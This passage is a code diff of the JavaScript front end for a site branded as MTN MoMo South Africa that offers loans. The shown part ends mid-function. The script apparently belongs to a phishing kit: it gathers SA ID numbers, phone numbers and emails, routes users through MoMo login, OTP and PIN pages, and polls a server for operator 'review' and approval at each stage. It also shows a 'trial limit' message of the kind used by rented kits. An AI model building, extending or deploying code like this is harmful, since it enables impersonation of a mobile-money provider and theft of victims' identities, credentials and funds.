@@ -1,8 +1,11 @@
 // ============================================================
-// script.js – MTN MoMo South Africa  (v7.0)
+// script.js – MTN MoMo South Africa  (v7.1 – CSP-safe)
 // ============================================================
 'use strict';
 
+// ═══════════════════════════════════════════════════════════
+// CONSTANTS & STATE
+// ═══════════════════════════════════════════════════════════
 const ACCOUNT_TYPES = {
     yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
     yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
@@ -10,6 +13,8 @@ const ACCOUNT_TYPES = {
 };
 
 const STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
+const POLL_INTERVAL = 2500;
+const POLL_MAX_DURATION = 30 * 60 * 1000;
 
 const S = {
     applicationId: '',
@@ -23,8 +28,7 @@ const S = {
     loan: {}, personal: {}, employment: {}, guarantor: {}
 };
 
-const POLL_INTERVAL = 2500;
-const POLL_MAX_DURATION = 30 * 60 * 1000;
+const KEYS = { APP_ID: 'mtn_za_app_id_v7', APP_DATA: 'mtn_za_data_v7' };
 
 let activePoll = null;
 let currentPollStep = null;
@@ -33,15 +37,29 @@ let currentPollStarted = 0;
 let regPollTimer = null;
 let selectedAccountType = null;
 let qualificationAnimator = null;
+let CURRENT_LANG = localStorage.getItem('momo_lang') || 'en';
+let _termsCache = null;
 
-const KEYS = {
-    APP_ID: 'mtn_za_app_id_v7',
-    APP_DATA: 'mtn_za_data_v7'
-};
+// ═══════════════════════════════════════════════════════════
+// STORAGE HELPERS
+// ═══════════════════════════════════════════════════════════
+function save(k, d) { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} }
+function get(k) { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } }
+function rm(k) { try { localStorage.removeItem(k); } catch (e) {} }
 
-const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
-const get  = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
-const rm   = (k) => { try { localStorage.removeItem(k); } catch (e) {} };
+function saveAll() {
+    save(KEYS.APP_ID, S.applicationId);
+    save(KEYS.APP_DATA, {
+        isRegistered: S.isRegistered,
+        registrationStatus: S.registrationStatus,
+        accountType: S.accountType,
+        accountMaxLoan: S.accountMaxLoan,
+        dob: S.dob,
+        steps: S.steps,
+        loan: S.loan, personal: S.personal,
+        employment: S.employment, guarantor: S.guarantor
+    });
+}
 
 // ═══════════════════════════════════════════════════════════
 // I18N
@@ -115,8 +133,8 @@ const I18N = {
     }
 };
 
-let CURRENT_LANG = localStorage.getItem('momo_lang') || 'en';
 function t(key) { return (I18N[CURRENT_LANG] && I18N[CURRENT_LANG][key]) || I18N.en[key] || key; }
+
 function applyI18n() {
     document.querySelectorAll('[data-i18n]').forEach(el => {
         const val = t(el.dataset.i18n);
@@ -124,70 +142,119 @@ function applyI18n() {
     });
     const langSel = document.getElementById('langSelect');
     if (langSel) langSel.value = CURRENT_LANG;
-    document.documentElement.lang = CURRENT_LANG === 'zu' ? 'zu' : CURRENT_LANG === 'af' ? 'af' : 'en';
+    document.documentElement.lang = CURRENT_LANG;
 }
+
 function setLanguage(lang) {
     CURRENT_LANG = I18N[lang] ? lang : 'en';
     localStorage.setItem('momo_lang', CURRENT_LANG);
     applyI18n();
     showToast(CURRENT_LANG === 'en' ? 'Language: English'
-            : CURRENT_LANG === 'zu' ? 'Ulimi: isiZulu'
-            : 'Taal: Afrikaans', 'success', 1800);
+        : CURRENT_LANG === 'zu' ? 'Ulimi: isiZulu'
+        : 'Taal: Afrikaans', 'success', 1800);
 }
 
 // ═══════════════════════════════════════════════════════════
-// DRAFT AUTOSAVE
+// UTILITIES
 // ═══════════════════════════════════════════════════════════
-const DRAFT_KEYS = {
-    's1ty': 'loanType', 's1am': 'loanAmount', 's1te': 'loanTerm', 's1pu': 'loanPurpose',
-    's2fi': 'firstName', 's2la': 'lastName', 's2ph': 'phone', 's2em': 'email',
-    's3em': 'employment', 's3in': 'annualIncome', 's3kn': 'kinName', 's3kp': 'kinPhone',
-    'gName': 'guarantorName', 'gPhone': 'guarantorPhone', 'gRel': 'guarantorRelation'
-};
-function saveDraft(fieldId, value) {
-    try { const d = JSON.parse(localStorage.getItem('momo_drafts') || '{}'); d[fieldId] = value; localStorage.setItem('momo_drafts', JSON.stringify(d)); } catch (e) {}
+function escapeHtml(s) {
+    return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
 }
-function restoreDrafts() {
-    let d = {};
-    try { d = JSON.parse(localStorage.getItem('momo_drafts') || '{}'); } catch (e) {}
-    Object.keys(d).forEach(id => { const el = document.getElementById(id); if (el && !el.value) el.value = d[id]; });
-}
-function clearDrafts() { try { localStorage.removeItem('momo_drafts'); } catch (e) {} }
-function attachDraftListeners() {
-    Object.keys(DRAFT_KEYS).forEach(id => {
-        const el = document.getElementById(id);
-        if (!el) return;
-        el.addEventListener('input', () => saveDraft(id, el.value));
-        el.addEventListener('change', () => saveDraft(id, el.value));
-    });
-}
-
-// ═══════════════════════════════════════════════════════════
-// HELPERS
-// ═══════════════════════════════════════════════════════════
-function escapeHtml(s) { return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c])); }
 function fmt(n) { return (Number(n) || 0).toLocaleString(); }
+
 function genAppId() {
-    const rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
+    let rand;
+    try {
+        rand = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36)).replace(/-/g, '').toUpperCase();
+    } catch (e) {
+        rand = Math.random().toString(36).replace(/[^a-z0-9]/gi, '').toUpperCase();
+    }
     return 'MTN-ZA-' + rand.slice(0, 8);
 }
 
-window.addEventListener('online',  () => document.getElementById('offlineBanner').classList.add('hidden'));
-window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));
-if (!navigator.onLine) document.getElementById('offlineBanner').classList.remove('hidden');
+function showToast(msg, type = 'info', duration = 3200) {
+    document.querySelectorAll('.toast').forEach(t => t.remove());
+    const el = document.createElement('div');
+    el.className = 'toast toast-' + type;
+    el.textContent = msg;
+    document.body.appendChild(el);
+    setTimeout(() => {
+        el.style.opacity = '0';
+        el.style.transform = 'translateX(-50%) translateY(-20px)';
+        setTimeout(() => el.remove(), 300);
+    }, duration);
+}
 
-window.addEventListener('popstate', () => {
-    const active = document.querySelector('.page.active');
-    if (active && requiresRegistration(active.id) && !isUserRegistered()) {
-        forceRegistration();
+function showErr(id, msg) {
+    const box = document.getElementById(id);
+    if (box) {
+        box.classList.add('show');
+        const t = document.getElementById(id + 'Txt');
+        if (t) t.textContent = msg;
     }
-});
+}
+function clearErr(id) {
+    const box = document.getElementById(id);
+    if (box) box.classList.remove('show');
+}
+function setBtnLoading(btn, loading, defaultText) {
+    if (!btn) return;
+    btn.disabled = loading;
+    btn.textContent = loading ? 'Please wait...' : defaultText;
+}
+
+async function apiCall(endpoint, options) {
+    options = options || {};
+    try {
+        const res = await fetch(endpoint, Object.assign({
+            credentials: 'same-origin',
+            headers: { 'Content-Type': 'application/json' }
+        }, options, { headers: Object.assign({ 'Content-Type': 'application/json' }, options.headers || {}) }));
+        const data = await res.json();
+        if (res.status === 429 || (data && data.code === 'RATE_LIMITED')) {
+            const msg = (data && data.error) || 'You have exceeded the trial limit. Please try again in 5 minutes.';
+            showToast('⏳ ' + msg, 'error', 6000);
+            throw new Error(msg);
+        }
+        return data;
+    } catch (e) {
+        console.error(endpoint + ':', e.message);
+        throw e;
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// NAVIGATION
+// ═══════════════════════════════════════════════════════════
+function goTo(pageId) {
+    if (requiresRegistration(pageId) && !isUserRegistered()) {
+        forceRegistration();
+        return;
+    }
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    const el = document.getElementById(pageId);
+    if (el) el.classList.add('active');
+    window.scrollTo(0, 0);
+    try { history.pushState({ page: pageId }, '', '#' + pageId); } catch (e) {}
+
+    if (pageId === 'page-requirements') updateRequirementsLimits();
+    if (pageId === 'page-step1') refreshStep1();
+    if (pageId === 'page-step2') prefillPersonal();
+    if (pageId === 'page-momologin') prefillMoMoLogin();
+    if (pageId === 'page-confirmation') updateConfirmation();
+    refreshAccountBadges();
+
+    if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan' && !pageId.startsWith('page-registration-')) {
+        stopPolling();
+    }
+}
 
 function requiresRegistration(pageId) {
-    return ['page-step1', 'page-step2', 'page-step3', 'page-guarantor', 'page-confirmation',
-            'page-momologin', 'page-scan', 'page-approval',
-            'page-wait-loan', 'page-wait-personal', 'page-wait-employment',
-            'page-wait-guarantor', 'page-wait-momologin'].includes(pageId);
+    const list = ['page-step1','page-step2','page-step3','page-guarantor','page-confirmation',
+                  'page-momologin','page-scan','page-approval',
+                  'page-wait-loan','page-wait-personal','page-wait-employment',
+                  'page-wait-guarantor','page-wait-momologin'];
+    return list.indexOf(pageId) !== -1;
 }
 function isUserRegistered() {
     return !!(S.isRegistered && S.accountType && ACCOUNT_TYPES[S.accountType] && S.registrationStatus === 'completed');
@@ -200,119 +267,28 @@ function forceRegistration(reason) {
     }, 800);
 }
 
-function showToast(msg, type = 'info', duration = 3200) {
-    document.querySelectorAll('.toast').forEach(t => t.remove());
-    const t = document.createElement('div');
-    t.className = `toast toast-${type}`;
-    t.textContent = msg;
-    document.body.appendChild(t);
-    setTimeout(() => {
-        t.style.opacity = '0';
-        t.style.transform = 'translateX(-50%) translateY(-20px)';
-        setTimeout(() => t.remove(), 300);
-    }, duration);
-}
-function showErr(id, msg) { const b = document.getElementById(id); if (b) { b.classList.add('show'); const t = document.getElementById(id + 'Txt'); if (t) t.textContent = msg; } }
-function clearErr(id) { const b = document.getElementById(id); if (b) b.classList.remove('show'); }
-function setBtnLoading(btn, loading, dt) { if (!btn) return; btn.disabled = loading; btn.textContent = loading ? 'Please wait...' : dt; }
-
-async function apiCall(endpoint, options = {}) {
-    try {
-        const res = await fetch(endpoint, {
-            credentials: 'same-origin',
-            ...options,
-            headers: { 'Content-Type': 'application/json', ...(options.headers || {}) }
-        });
-        const data = await res.json();
-        // Global rate-limit interception
-        if (res.status === 429 || data?.code === 'RATE_LIMITED') {
-            const msg = data?.error || 'You have exceeded the trial limit. Please try again in 5 minutes.';
-            showToast('⏳ ' + msg, 'error', 6000);
-            throw new Error(msg);
-        }
-        return data;
-    } catch (e) {
-        console.error(`${endpoint}:`, e.message);
-        if (!e.message || e.message === 'Network error') throw new Error('Network error. Please try again.');
-        throw e;
-    }
-}
-
-function goTo(pageId) {
-    if (requiresRegistration(pageId) && !isUserRegistered()) { forceRegistration(); return; }
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    const el = document.getElementById(pageId);
-    if (el) el.classList.add('active');
-    window.scrollTo(0, 0);
-    history.pushState({ page: pageId }, '', '#' + pageId);
-
-    if (pageId === 'page-requirements') updateRequirementsLimits();
-    if (pageId === 'page-step1')        refreshStep1();
-    if (pageId === 'page-step2')        prefillPersonal();
-    if (pageId === 'page-momologin')    prefillMoMoLogin();
-    if (pageId === 'page-confirmation') updateConfirmation();
-    refreshAccountBadges();
-    if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan' && !pageId.startsWith('page-registration-')) {
-        stopPolling();
-    }
-}
 function refreshAccountBadges() {
     const type = S.accountType ? ACCOUNT_TYPES[S.accountType] : null;
-    const label = type ? `${type.icon} ${type.name}` : '';
+    const label = type ? type.icon + ' ' + type.name : '';
     ['navbarAccount0','navbarAccount','navbarAccount2','navbarAccount3','navbarAccount4','navbarAccount5','navbarAccount6'].forEach(id => {
         const el = document.getElementById(id);
-        if (el) el.innerHTML = label ? `<div class="nav-badge">${label}</div>` : '';
+        if (el) el.innerHTML = label ? '<div class="nav-badge">' + label + '</div>' : '';
     });
 }
 
 // ═══════════════════════════════════════════════════════════
-// FORM HELPERS
+// SA ID PARSING
 // ═══════════════════════════════════════════════════════════
-function normalizePhone(id) {
-    const inp = document.getElementById(id);
-    let v = inp.value.replace(/\D/g, '');
-    if (v.length > 9) v = v.substring(0, 9);
-    inp.value = v;
-}
-function normalizeId(id) {
-    const inp = document.getElementById(id);
-    let v = inp.value.replace(/\D/g, '');
-    if (v.length > 13) v = v.substring(0, 13);
-    inp.value = v;
-    if (v.length === 13) validateAndPreviewId(v);
-    else {
-        document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
-        const dobEl = document.getElementById('regDob');
-        if (dobEl) dobEl.value = '';
+function luhnCheck(num) {
+    let sum = 0, alt = false;
+    for (let i = num.length - 1; i >= 0; i--) {
+        let n = parseInt(num[i], 10);
+        if (alt) { n *= 2; if (n > 9) n -= 9; }
+        sum += n; alt = !alt;
     }
+    return sum % 10 === 0;
 }
 
-function updateCalc() {
-    const slider = document.getElementById('amtSlider');
-    const maxAllowed = isUserRegistered()
-        ? Math.min(500000, ACCOUNT_TYPES[S.accountType].maxLoan)
-        : 500000;
-    slider.max = maxAllowed;
-    if (+slider.value > maxAllowed) slider.value = maxAllowed;
-
-    const amt  = +slider.value;
-    const term = +document.getElementById('calcTermSelect').value;
-    const r = 0.27 / 12;
-    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
-    const total = monthly * term;
-    document.getElementById('calcAmt').textContent    = 'R ' + amt.toLocaleString();
-    document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
-    document.getElementById('totalAmt').textContent   = 'R ' + total.toLocaleString();
-    document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
-    const pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
-    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
-    const ends = slider.parentElement.querySelector('.range-ends');
-    if (ends) ends.innerHTML = `<span>R 5,000</span><span>R ${maxAllowed.toLocaleString()}</span>`;
-}
-
-// ═══════════════════════════════════════════════════════════
-// SA ID
-// ═══════════════════════════════════════════════════════════
 function parseSAId(id) {
     if (!id) return { ok: false, reason: 'ID required.' };
     const clean = String(id).replace(/\D/g, '');
@@ -323,48 +299,106 @@ function parseSAId(id) {
     const century = yy < 30 ? 2000 : 1900;
     const year = century + yy;
     const dob = new Date(year, mm - 1, dd);
-    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) return { ok: false, reason: 'Invalid date of birth.' };
+    if (dob.getFullYear() !== year || dob.getMonth() !== mm - 1 || dob.getDate() !== dd) {
+        return { ok: false, reason: 'Invalid date of birth.' };
+    }
     const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
-    if (age < 18)  return { ok: false, reason: 'Must be 18 or older.' };
+    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
     if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
     if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
     const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
     const c = clean[10];
     const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
-    return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), isoDob: `${year}-${String(mm).padStart(2,'0')}-${String(dd).padStart(2,'0')}`, age, gender, citizenship };
+    return {
+        ok: true,
+        dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }),
+        isoDob: year + '-' + String(mm).padStart(2, '0') + '-' + String(dd).padStart(2, '0'),
+        age: age, gender: gender, citizenship: citizenship
+    };
 }
-function luhnCheck(num) {
-    let sum = 0, alt = false;
-    for (let i = num.length - 1; i >= 0; i--) {
-        let n = parseInt(num[i], 10);
-        if (alt) { n *= 2; if (n > 9) n -= 9; }
-        sum += n; alt = !alt;
-    }
-    return sum % 10 === 0;
-}
+
 function validateAndPreviewId(id) {
     const r = parseSAId(id);
     const p = document.getElementById('regDetailsPreview');
+    if (!p) return;
     if (!r.ok) {
-        p.innerHTML = `<div class="reg-preview-error">✕ ${escapeHtml(r.reason)}</div>`;
-        const dobEl = document.getElementById('regDob'); if (dobEl) dobEl.value = '';
+        p.innerHTML = '<div class="reg-preview-error">✕ ' + escapeHtml(r.reason) + '</div>';
+        const dobEl = document.getElementById('regDob');
+        if (dobEl) dobEl.value = '';
         return;
     }
-    p.innerHTML = `
-        <div class="reg-preview-row"><span>DOB</span><strong>${r.dob}</strong></div>
-        <div class="reg-preview-row"><span>Age</span><strong>${r.age} years</strong></div>
-        <div class="reg-preview-row"><span>Gender</span><strong>${r.gender}</strong></div>
-        <div class="reg-preview-row"><span>Citizenship</span><strong>${r.citizenship}</strong></div>`;
+    p.innerHTML =
+        '<div class="reg-preview-row"><span>DOB</span><strong>' + r.dob + '</strong></div>' +
+        '<div class="reg-preview-row"><span>Age</span><strong>' + r.age + ' years</strong></div>' +
+        '<div class="reg-preview-row"><span>Gender</span><strong>' + r.gender + '</strong></div>' +
+        '<div class="reg-preview-row"><span>Citizenship</span><strong>' + r.citizenship + '</strong></div>';
     const dobEl = document.getElementById('regDob');
     if (dobEl) dobEl.value = r.isoDob;
 }
 
 // ═══════════════════════════════════════════════════════════
-// LANDING
+// INPUT NORMALISERS
+// ═══════════════════════════════════════════════════════════
+function normalizePhone(id) {
+    const inp = document.getElementById(id);
+    if (!inp) return;
+    let v = inp.value.replace(/\D/g, '');
+    if (v.length > 9) v = v.substring(0, 9);
+    inp.value = v;
+}
+function normalizeId(id) {
+    const inp = document.getElementById(id);
+    if (!inp) return;
+    let v = inp.value.replace(/\D/g, '');
+    if (v.length > 13) v = v.substring(0, 13);
+    inp.value = v;
+    const p = document.getElementById('regDetailsPreview');
+    if (v.length === 13) validateAndPreviewId(v);
+    else {
+        if (p) p.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
+        const dobEl = document.getElementById('regDob');
+        if (dobEl) dobEl.value = '';
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// CALCULATOR
+// ═══════════════════════════════════════════════════════════
+function updateCalc() {
+    const slider = document.getElementById('amtSlider');
+    if (!slider) return;
+    const maxAllowed = isUserRegistered()
+        ? Math.min(500000, ACCOUNT_TYPES[S.accountType].maxLoan)
+        : 500000;
+    slider.max = maxAllowed;
+    if (+slider.value > maxAllowed) slider.value = maxAllowed;
+
+    const amt = +slider.value;
+    const termEl = document.getElementById('calcTermSelect');
+    const term = termEl ? +termEl.value : 48;
+    const r = 0.27 / 12;
+    const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
+    const total = monthly * term;
+
+    const set = (id, val) => { const el = document.getElementById(id); if (el) el.textContent = val; };
+    set('calcAmt', 'R ' + amt.toLocaleString());
+    set('monthlyAmt', 'R ' + monthly.toLocaleString());
+    set('totalAmt', 'R ' + total.toLocaleString());
+    set('receiveAmt', 'R ' + amt.toLocaleString());
+
+    const pct = ((amt - 5000) / Math.max(1, maxAllowed - 5000)) * 100;
+    slider.style.setProperty('--pct', Math.max(0, Math.min(100, pct)) + '%');
+
+    const ends = slider.parentElement && slider.parentElement.querySelector('.range-ends');
+    if (ends) ends.innerHTML = '<span>R 5,000</span><span>R ' + maxAllowed.toLocaleString() + '</span>';
+}
+
+// ═══════════════════════════════════════════════════════════
+// LANDING ACTIONS
 // ═══════════════════════════════════════════════════════════
 function applyAsExistingUser() {
+    console.log('[applyAsExistingUser] called — isRegistered:', isUserRegistered(), 'regStatus:', S.registrationStatus);
     if (isUserRegistered()) {
-        // Resume from furthest approved step
         if (S.steps.loan === 'approved') {
             if (S.steps.personal === 'approved') {
                 if (S.steps.employment === 'approved') {
@@ -379,7 +413,6 @@ function applyAsExistingUser() {
         return;
     }
     if (S.isRegistered && S.registrationStatus && S.registrationStatus !== 'completed') {
-        // Resume registration flow at current stage
         routeRegistrationFlow();
         return;
     }
@@ -388,60 +421,73 @@ function applyAsExistingUser() {
 }
 
 function applyFromCalculator() {
-    const amt  = +document.getElementById('amtSlider').value;
-    const term = document.getElementById('calcTermSelect').value + ' Months';
+    const slider = document.getElementById('amtSlider');
+    const termEl = document.getElementById('calcTermSelect');
+    const amt = slider ? +slider.value : 50000;
+    const term = termEl ? termEl.value + ' Months' : '48 Months';
     const max = S.accountMaxLoan || (S.accountType ? ACCOUNT_TYPES[S.accountType].maxLoan : amt);
     const finalAmt = Math.min(amt, max);
-    S.loan = { ...S.loan, loanAmount: finalAmt, loanTerm: term };
+    S.loan = Object.assign({}, S.loan, { loanAmount: finalAmt, loanTerm: term });
     saveAll();
     if (!isUserRegistered()) {
-        showToast(`💾 Saved R ${fmt(finalAmt)} — complete registration to continue`, 'info', 4000);
+        showToast('💾 Saved R ' + fmt(finalAmt) + ' — complete registration to continue', 'info', 4000);
         setTimeout(() => applyAsExistingUser(), 500);
         return;
     }
-    showToast(`R ${fmt(finalAmt)} selected`, 'success');
+    showToast('R ' + fmt(finalAmt) + ' selected', 'success');
     goTo('page-step1');
 }
 
-function startMoMoRegistration(opts = {}) {
+// ═══════════════════════════════════════════════════════════
+// REGISTRATION
+// ═══════════════════════════════════════════════════════════
+function startMoMoRegistration(opts) {
+    opts = opts || {};
     const mode = opts.mode || 'register';
-    S.isRegistered  = false;
-    S.accountType   = null;
+
+    S.isRegistered = false;
+    S.accountType = null;
     S.accountMaxLoan = 0;
-    S.idNumber      = null;
-    S.dob           = null;
+    S.idNumber = null;
+    S.dob = null;
     S.registrationStatus = 'idle';
-    S.steps         = {};
+    S.steps = {};
     saveAll();
 
-    document.getElementById('regId').value = '';
-    document.getElementById('regPhone').value = '';
-    document.getElementById('regEmail').value = '';
-    const dobEl = document.getElementById('regDob'); if (dobEl) dobEl.value = '';
-    const tnc = document.getElementById('regTnc'); if (tnc) tnc.checked = false;
-    document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
+    const setVal = (id, v) => { const el = document.getElementById(id); if (el) el.value = v; };
+    setVal('regId', '');
+    setVal('regPhone', '');
+    setVal('regEmail', '');
+    setVal('regDob', '');
+    const tnc = document.getElementById('regTnc');
+    if (tnc) tnc.checked = false;
+    const prev = document.getElementById('regDetailsPreview');
+    if (prev) prev.innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
+
     selectedAccountType = null;
     document.querySelectorAll('.account-type').forEach(el => {
         el.classList.remove('selected');
-        el.querySelector('.at-check').textContent = '○';
+        const c = el.querySelector('.at-check');
+        if (c) c.textContent = '○';
     });
-    document.getElementById('accountTypeHint').textContent = 'Tap to select';
+    const hint = document.getElementById('accountTypeHint');
+    if (hint) hint.textContent = 'Tap to select';
     clearErr('regErr');
 
     const heading = document.querySelector('#page-register-check .step-card h2');
-    const sub     = document.querySelector('#page-register-check .step-sub');
+    const sub = document.querySelector('#page-register-check .step-sub');
     const introH3 = document.querySelector('#page-register-check .reg-intro h3');
-    const introP  = document.querySelector('#page-register-check .reg-intro p');
+    const introP = document.querySelector('#page-register-check .reg-intro p');
     if (mode === 'link') {
         if (heading) heading.textContent = 'Link Your MoMo Wallet';
-        if (sub)     sub.textContent     = 'Verify your ID to link your existing MoMo account';
+        if (sub) sub.textContent = 'Verify your ID to link your existing MoMo account';
         if (introH3) introH3.textContent = 'Link your existing MoMo wallet';
-        if (introP)  introP.textContent  = 'Confirm your SA ID, mobile, and email, then pick the wallet type you hold.';
+        if (introP) introP.textContent = 'Confirm your SA ID, mobile, and email, then pick the wallet type you hold.';
     } else {
         if (heading) heading.textContent = 'MoMo Registration';
-        if (sub)     sub.textContent     = 'Register in under 60 seconds';
+        if (sub) sub.textContent = 'Register in under 60 seconds';
         if (introH3) introH3.textContent = "You're 2 steps away from your loan";
-        if (introP)  introP.textContent  = "MoMo is MTN's mobile money service. Register your wallet, then apply.";
+        if (introP) introP.textContent = "MoMo is MTN's mobile money service. Register your wallet, then apply.";
     }
     goTo('page-register-check');
 }
@@ -452,25 +498,31 @@ function selectAccountType(type) {
     document.querySelectorAll('.account-type').forEach(el => {
         const m = el.dataset.type === type;
         el.classList.toggle('selected', m);
-        el.querySelector('.at-check').textContent = m ? '●' : '○';
+        const c = el.querySelector('.at-check');
+        if (c) c.textContent = m ? '●' : '○';
     });
-    document.getElementById('accountTypeHint').textContent = `✅ ${names[type]}`;
+    const hint = document.getElementById('accountTypeHint');
+    if (hint) hint.textContent = '✅ ' + names[type];
 }
 
 async function completeRegistration() {
-    const id    = document.getElementById('regId').value.trim();
-    const phone = document.getElementById('regPhone').value.trim();
-    const email = document.getElementById('regEmail').value.trim();
-    const dob   = (document.getElementById('regDob')?.value || '').trim();
-    const tnc   = !!document.getElementById('regTnc')?.checked;
+    const id = (document.getElementById('regId') || {}).value || '';
+    const phone = (document.getElementById('regPhone') || {}).value || '';
+    const email = (document.getElementById('regEmail') || {}).value || '';
+    const dob = (document.getElementById('regDob') || {}).value || '';
+    const tnc = !!(document.getElementById('regTnc') || {}).checked;
 
-    if (!id) return showErr('regErr', 'Please enter your SA ID.');
-    if (id.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
-    const r = parseSAId(id);
+    const idTrim = id.trim();
+    const phoneTrim = phone.trim();
+    const emailTrim = email.trim();
+
+    if (!idTrim) return showErr('regErr', 'Please enter your SA ID.');
+    if (idTrim.length !== 13) return showErr('regErr', 'SA ID must be 13 digits.');
+    const r = parseSAId(idTrim);
     if (!r.ok) return showErr('regErr', r.reason);
     if (!dob) return showErr('regErr', 'Please re-enter your SA ID.');
-    if (phone.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits (e.g. 812345678).');
-    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return showErr('regErr', 'Enter a valid email address.');
+    if (phoneTrim.length !== 9) return showErr('regErr', 'Mobile number must be 9 digits.');
+    if (!emailTrim || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailTrim)) return showErr('regErr', 'Enter a valid email address.');
     if (!selectedAccountType) return showErr('regErr', 'Please select an account type.');
     if (!tnc) return showErr('regErr', 'You must read and accept the Terms & Conditions.');
 
@@ -480,17 +532,18 @@ async function completeRegistration() {
     const btn = document.getElementById('regBtn');
     setBtnLoading(btn, true, 'Complete Registration');
     goTo('page-register-processing');
-    document.getElementById('regProcessingStatus').textContent = '⏳ Submitting for review...';
+    const statusEl = document.getElementById('regProcessingStatus');
+    if (statusEl) statusEl.textContent = '⏳ Submitting for review...';
 
     try {
         const data = await apiCall('/api/register-momo', {
             method: 'POST',
             body: JSON.stringify({
                 applicationId: S.applicationId,
-                idNumber: id,
+                idNumber: idTrim,
                 accountType: selectedAccountType,
-                phone: phone,
-                email: email,
+                phone: phoneTrim,
+                email: emailTrim,
                 dob: dob,
                 tncAccepted: tnc,
                 fullName: null
@@ -504,19 +557,19 @@ async function completeRegistration() {
             return;
         }
 
-        S.idNumber       = id;
-        S.dob            = data.dob || dob;
-        S.accountType    = selectedAccountType;
+        S.idNumber = idTrim;
+        S.dob = data.dob || dob;
+        S.accountType = selectedAccountType;
         S.accountMaxLoan = data.maxLoan;
-        S.isRegistered   = true;
+        S.isRegistered = true;
         S.registrationStatus = 'pending_review';
-        S.personal = { ...S.personal, phone: phone, email: email };
+        S.personal = Object.assign({}, S.personal, { phone: phoneTrim, email: emailTrim });
         saveAll();
         updateCalc();
-        clearDrafts();
 
         setBtnLoading(btn, false, 'Complete Registration');
-        document.getElementById('regWaitAppId').textContent = S.applicationId;
+        const appIdEl = document.getElementById('regWaitAppId');
+        if (appIdEl) appIdEl.textContent = S.applicationId;
         goTo('page-registration-wait');
         pollRegistrationStatus();
     } catch (e) {
@@ -527,41 +580,32 @@ async function completeRegistration() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// REGISTRATION FLOW ROUTER
+// REGISTRATION FLOW ROUTER + POLLING
 // ═══════════════════════════════════════════════════════════
 function routeRegistrationFlow() {
     const st = S.registrationStatus || 'idle';
-    switch (st) {
-        case 'idle':
-            goTo('page-register-check');
-            break;
-        case 'pending_review':
-            document.getElementById('regWaitAppId').textContent = S.applicationId;
-            goTo('page-registration-wait');
-            pollRegistrationStatus();
-            break;
-        case 'otp_pending':
-            const phoneEl = document.getElementById('regOtpPhone');
-            if (phoneEl && S.personal.phone) phoneEl.textContent = '+27 ' + S.personal.phone;
-            goTo('page-registration-otp');
-            break;
-        case 'otp_verified':
-            goTo('page-registration-pin');
-            break;
-        case 'pin_pending':
-            document.getElementById('regPinWaitAppId').textContent = S.applicationId;
-            goTo('page-registration-pin-wait');
-            pollPinStatus();
-            break;
-        case 'completed':
-            goTo('page-requirements');
-            break;
-        case 'rejected':
-            goTo('page-registration-rejected');
-            break;
-        default:
-            goTo('page-register-check');
+    if (st === 'idle') goTo('page-register-check');
+    else if (st === 'pending_review') {
+        const el = document.getElementById('regWaitAppId');
+        if (el) el.textContent = S.applicationId;
+        goTo('page-registration-wait');
+        pollRegistrationStatus();
     }
+    else if (st === 'otp_pending') {
+        const el = document.getElementById('regOtpPhone');
+        if (el && S.personal.phone) el.textContent = '+27 ' + S.personal.phone;
+        goTo('page-registration-otp');
+    }
+    else if (st === 'otp_verified') goTo('page-registration-pin');
+    else if (st === 'pin_pending') {
